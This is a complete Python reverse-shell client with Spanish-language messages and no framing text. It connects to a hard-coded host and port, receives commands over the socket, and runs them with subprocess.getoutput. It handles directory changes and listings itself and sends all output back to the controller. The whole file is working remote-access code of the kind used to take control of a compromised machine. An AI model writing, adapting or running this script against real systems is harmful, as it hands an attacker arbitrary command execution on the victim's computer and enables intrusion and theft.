from colorama import Fore, Style, init
import socket, subprocess, os, sys

init(autoreset=True)
GREEN=f'{Fore.GREEN}{Style.BRIGHT}'
WHITE=f'{Fore.WHITE}{Style.BRIGHT}'
YELLOW=f'{Fore.YELLOW}{Style.BRIGHT}'

HOST = '192.168.230.81'
PORT = 5421
try:
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
  client_socket.connect((HOST, PORT))
  while True:
   command = client_socket.recv(1024).decode()
   if command.lower() == "exit":
    break
   elif command == 'cls' or command == 'clear':
    pass
   elif command.startswith("cd "):
    try:
     os.chdir(command[3:].strip())
     output = f"{WHITE}Directorio cambiado a: {GREEN}{os.getcwd()}"
    except Exception as e:
     output = f"Error al cambiar de directorio: {str(e)}"
   elif command == 'ls':
    dflist = os.listdir()
    output = ''
    for i in dflist:
     consult = os.path.isfile(i)
     if consult != True:
      output += f'{GREEN}[DIR] =>{WHITE} {i}\n'
    for i in dflist:
     consult = os.path.isfile(i)
     if consult == True:
      output += f'{YELLOW}[FILE] => {WHITE}{i}\n'
   else:
    output = subprocess.getoutput(command)
   output_length = len(output.encode())
   client_socket.send(str(output_length).encode())
   client_socket.send(output.encode())
except ConnectionResetError:
 print('\nConexion Cerrada...')
except KeyboardInterrupt:
 print('\nHASTA LA PROXIMA')
 sys.exit()
